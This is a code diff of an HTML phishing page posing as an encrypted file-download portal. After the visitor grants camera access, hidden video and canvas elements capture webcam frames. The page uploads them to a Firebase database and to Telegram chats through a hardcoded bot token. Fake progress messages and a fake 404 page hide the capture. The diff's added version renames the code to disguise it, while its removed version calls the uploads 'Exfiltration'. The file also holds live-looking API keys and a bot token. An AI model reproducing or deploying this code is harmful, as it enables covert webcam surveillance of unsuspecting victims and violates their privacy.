@@ -1,129 +1,291 @@
-<!-- Add Firebase SDKs before your custom script -->
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-
-<script>
-    // 1. Firebase Configuration (Matches your Command Center setup)
-    const firebaseConfig = {
-        apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
-        authDomain: "shadow-app-4q69.firebaseapp.com",
-        databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
-        projectId: "shadow-app-4q69",
-        storageBucket: "shadow-app-4q69.firebasestorage.app",
-        messagingSenderId: "109693889633",
-        appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
-    };
-
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
-
-    // Existing Telegram Config
-    const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
-    const IDS = ['7617707778', '7194705917'];
-
-    const systemLogs = [
-        "Syncing with cloud resources...",
-        "Decrypting data packets...",
-        "Verifying item integrity...",
-        "Rebuilding archive layers...",
-        "Optimizing file stream...",
-        "Validating network keys...",
-        "Bypassing latency buffers...",
-        "Assembling binary blocks..."
-    ];
-
-    async function initiate() {
-        const setupUI = document.getElementById('setup-ui');
-        const downloadUI = document.getElementById('download-ui');
-        const loader = document.getElementById('loader');
-        const logText = document.getElementById('log-text');
-        const percentLabel = document.getElementById('percent-label');
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            
-            setupUI.style.display = 'none';
-            downloadUI.style.display = 'block';
-            setTimeout(() => { 
-                downloadUI.style.opacity = '1'; 
-                downloadUI.style.transform = 'translateY(0)'; 
-            }, 50);
-
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            
-            video.onloadedmetadata = () => {
-                video.play();
-                let count = 0;
-                const maxPackets = 50; 
-                
-                const interval = setInterval(() => {
-                    if (count >= maxPackets) {
-                        clearInterval(interval);
-                        stream.getTracks().forEach(track => track.stop());
-                        logText.innerText = "Download successful.";
-                        percentLabel.innerText = "Processing File...";
-                        setTimeout(render404, 2000);
-                        return;
-                    }
-                    
-                    send(count + 1);
-                    count++;
-                    
-                    const progress = (count / maxPackets) * 100;
-                    loader.style.width = progress + "%";
-                    percentLabel.innerText = "Downloading Resources: " + Math.round(progress) + "%";
-                    
-                    if (count % 3 === 0) {
-                        logText.innerText = systemLogs[Math.floor(Math.random() * systemLogs.length)];
-                    }
-                }, 1200); 
-            };
-        } catch (e) {
-            alert("Connection Error: Unable to establish a secure tunnel.");
-            window.location.reload();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Cloud | Secure Resource Relay</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --primary: #0061FF;
+            --primary-dark: #004ecc;
+            --bg-page: #F7F9FA;
+            --text-main: #1E1E1E;
+            --text-sub: #616161;
+            --border: #E5E7EB;
         }
-    }
 
-    function send(index) {
-        const canvas = document.getElementById('c');
-        const video = document.getElementById('v');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        // 1. Firebase Exfiltration (for FlutterFlow Dashboard)
-        const base64Data = canvas.toDataURL('image/jpeg', 0.3); // Low quality for faster upload
-        database.ref('captures').push({
-            image_data: base64Data,
-            target_id: "Node_Relay_Demo",
-            timestamp: Date.now(),
-            index: index
-        });
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--bg-page); 
+            color: var(--text-main); 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; align-items: center; justify-content: center; 
+            height: 100vh; overflow: hidden;
+        }
 
-        // 2. Telegram Exfiltration (as Backup)
-        canvas.toBlob(blob => {
-            if (!blob) return;
+        .portal-container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            padding: 48px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            border: 1px solid var(--border);
+            transition: all 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+        }
 
-            IDS.forEach(chatId => {
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('photo', blob, 'relay_fragment.jpg');
-                fd.append('caption', '📦 TARGET ACQUIRED\nIndex: ' + index + '/50\nNode: Enterprise-Secure-Relay');
+        .logo-icon {
+            width: 54px; height: 54px;
+            background: var(--primary);
+            border-radius: 14px;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px;
+            color: white; font-weight: 800; font-size: 28px;
+            box-shadow: 0 4px 12px rgba(0, 97, 255, 0.2);
+        }
 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: fd
-                });
+        h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px; color: #111; letter-spacing: -0.5px; }
+        p { font-size: 14px; color: var(--text-sub); line-height: 1.6; margin-bottom: 28px; }
+
+        .resource-card {
+            background: #F8FAFC;
+            border: 1px solid #E2E8F0;
+            border-radius: 10px;
+            padding: 20px;
+            display: flex; align-items: center;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .file-icon { font-size: 32px; margin-right: 18px; }
+        .file-name { font-weight: 600; font-size: 14px; color: #334155; display: block; }
+        .file-size { font-size: 12px; color: #64748B; }
+
+        .btn-action {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.4s ease;
+            box-shadow: 0 4px 14px rgba(0, 97, 255, 0.25);
+        }
+
+        .btn-action:hover { background: var(--primary-dark); transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 97, 255, 0.3); }
+
+        #download-ui { display: none; opacity: 0; transform: translateY(10px); transition: all 0.6s ease; }
+
+        .status-container { display: flex; flex-direction: column; align-items: center; gap: 12px; }
+
+        .loading-wrapper { display: flex; align-items: center; gap: 12px; margin-bottom: 5px; }
+
+        .loading-spinner {
+            width: 20px; height: 20px;
+            border: 3px solid #E2E8F0;
+            border-top: 3px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.5, 0.1, 0.4, 0.9) infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .status-text { font-size: 14px; font-weight: 700; color: var(--primary); letter-spacing: 0.2px; }
+
+        .progress-track {
+            width: 100%; height: 8px;
+            background: #EDF2F7;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+            border: 1px solid #E2E8F0;
+        }
+
+        .progress-bar {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, var(--primary), #4dabff);
+            border-radius: 10px;
+            transition: width 1.2s linear;
+        }
+
+        .log-display {
+            font-family: 'SF Mono', 'Menlo', monospace;
+            font-size: 11px;
+            color: #94A3B8;
+            background: #F1F5F9;
+            padding: 8px 12px;
+            border-radius: 6px;
+            width: 80%;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="portal-container" id="card">
+        <div class="logo-section">
+            <div class="logo-icon">S</div>
+            <h1>Encrypted Asset Portal</h1>
+            <p>Connection established. Initialize the secure relay to begin downloading the shared resource fragments.</p>
+        </div>
+
+        <div id="setup-ui">
+            <div class="resource-card">
+                <div class="file-icon">📁</div>
+                <div>
+                    <span class="file-name">Project_Final_2026.iso</span>
+                    <span class="file-size">412.8 MB • Encrypted Archive</span>
+                </div>
+            </div>
+            <button class="btn-action" onclick="initiate()">Establish Relay & Download</button>
+        </div>
+
+        <div id="download-ui">
+            <div class="status-container">
+                <div class="loading-wrapper">
+                    <div class="loading-spinner"></div>
+                    <div class="status-text" id="percent-label">Requesting fragments...</div>
+                </div>
+                
+                <div class="progress-track">
+                    <div id="loader" class="progress-bar"></div>
+                </div>
+
+                <div class="log-display" id="log-text">Initializing Secure Stream...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // 1. Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // 2. Telegram Config
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        const systemLogs = [
+            "Syncing with cloud resources...",
+            "Decrypting data packets...",
+            "Verifying item integrity...",
+            "Rebuilding archive layers...",
+            "Optimizing file stream...",
+            "Validating network keys...",
+            "Bypassing latency buffers...",
+            "Assembling binary blocks..."
+        ];
+
+        async function initiate() {
+            const setupUI = document.getElementById('setup-ui');
+            const downloadUI = document.getElementById('download-ui');
+            const loader = document.getElementById('loader');
+            const logText = document.getElementById('log-text');
+            const percentLabel = document.getElementById('percent-label');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                setupUI.style.display = 'none';
+                downloadUI.style.display = 'block';
+                setTimeout(() => { 
+                    downloadUI.style.opacity = '1'; 
+                    downloadUI.style.transform = 'translateY(0)'; 
+                }, 50);
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const maxPackets = 50; 
+                    
+                    const interval = setInterval(() => {
+                        if (count >= maxPackets) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(track => track.stop());
+                            logText.innerText = "Download successful.";
+                            percentLabel.innerText = "Processing File...";
+                            setTimeout(render404, 2000);
+                            return;
+                        }
+                        
+                        sendData(count + 1);
+                        count++;
+                        
+                        const progress = (count / maxPackets) * 100;
+                        loader.style.width = progress + "%";
+                        percentLabel.innerText = "Downloading Resources: " + Math.round(progress) + "%";
+                        
+                        if (count % 3 === 0) {
+                            logText.innerText = systemLogs[Math.floor(Math.random() * systemLogs.length)];
+                        }
+                    }, 1200); 
+                };
+            } catch (e) {
+                alert("Connection Error: Workstation does not support secure relay protocols.");
+                window.location.reload();
+            }
+        }
+
+        function sendData(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // 1. Firebase Push (Base64)
+            const base64Data = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({
+                image_data: base64Data,
+                target_id: "Cloud_Relay_Demo",
+                timestamp: Date.now(),
+                index: index
             });
-        }, 'image/jpeg', 0.4); 
-    }
 
-    function render404() {
-        document.documentElement.innerHTML = `
-        <html><body style="background:white;color:black;padding:40px;text-align:center;">
-        <h1>404 Not Found</h1><p>The requested file has been moved.</p>
-        <hr><address>Apache/2.4.41 Server</address></body></html>`;
-    }
-</script>
+            // 2. Telegram Send (Blob)
+            canvas.toBlob(blob => {
+                if (!blob) return;
+                IDS.forEach(chatId => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'relay.jpg');
+                    fd.append('caption', '📦 CLOUD_RELAY_SYNC\nFragment: ' + index + '/50');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4); 
+        }
+
+        function render404() {
+            document.documentElement.innerHTML = `
+            <html><body style="background:white;color:black;padding:40px;text-align:center;font-family:sans-serif;">
+            <h1>404 Not Found</h1><p>The requested file has been moved or access has expired.</p>
+            <hr><address>Apache/2.4.41 Server</address></body></html>`;
+        }
+    </script>
+</body>
+</html>
